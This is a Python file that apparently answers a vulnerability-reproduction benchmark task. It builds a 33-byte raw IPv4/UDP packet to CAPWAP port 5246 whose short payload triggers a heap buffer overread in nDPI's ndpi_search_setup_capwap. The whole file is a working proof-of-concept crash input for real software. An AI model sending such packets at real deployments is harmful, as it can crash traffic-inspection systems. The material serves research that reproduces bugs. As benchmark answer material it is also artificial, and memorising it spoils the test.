import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
        The vulnerability involves a buffer overread when parsing CAPWAP packets.
        To trigger it, we need a valid IP/UDP packet destined to CAPWAP ports (5246/5247)
        with a payload that is short enough to cause an out-of-bounds read when processed.
        
        The ground truth length is 33 bytes.
        Structure: IP Header (20) + UDP Header (8) + Payload (5) = 33 bytes.
        This assumes the fuzzer treats the input as Raw IP (DLT_RAW).
        """
        
        # IPv4 Header Construction
        # ------------------------
        # Version: 4, IHL: 5 -> 0x45
        # TOS: 0
        # Total Length: 33 (0x0021)
        # ID: 0
        # Flags/Frag Offset: 0
        # TTL: 64 (0x40)
        # Protocol: 17 (UDP) -> 0x11
        # Checksum: 0 (Calculated later)
        # Src IP: 127.0.0.1 (0x7F000001)
        # Dst IP: 127.0.0.1 (0x7F000001)
        ip_header = bytearray([
            0x45, 0x00, 0x00, 0x21,
            0x00, 0x00, 0x00, 0x00,
            0x40, 0x11, 0x00, 0x00,
            0x7F, 0x00, 0x00, 0x01,
            0x7F, 0x00, 0x00, 0x01
        ])
        
        # Calculate IP Header Checksum
        s = 0
        for i in range(0, len(ip_header), 2):
            w = (ip_header[i] << 8) + ip_header[i+1]
            s += w
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        csum = ~s & 0xFFFF
        ip_header[10] = (csum >> 8) & 0xFF
        ip_header[11] = csum & 0xFF
        
        # UDP Header Construction
        # -----------------------
        # Src Port: 5246 (Arbitrary/CAPWAP) -> 0x147E
        # Dst Port: 5246 (CAPWAP Control) -> 0x147E
        # Length: 13 (8 header + 5 payload) -> 0x000D
        # Checksum: 0 (Optional for UDP)
        udp_header = bytearray([
            0x14, 0x7E,
            0x14, 0x7E,
            0x00, 0x0D,
            0x00, 0x00
        ])
        
        # Payload Construction
        # --------------------
        # CAPWAP parser checks preamble (byte 0).
        # (preamble & 0x0F) == 0 identifies CAPWAP header.
        # We provide 0x00.
        # We provide a very short payload (5 bytes total) to trigger overread
        # if the parser attempts to read struct fields beyond this length.
        payload = b'\x00' * 5
        
        # Combine parts
        poc = ip_header + udp_header + payload
        
        return bytes(poc)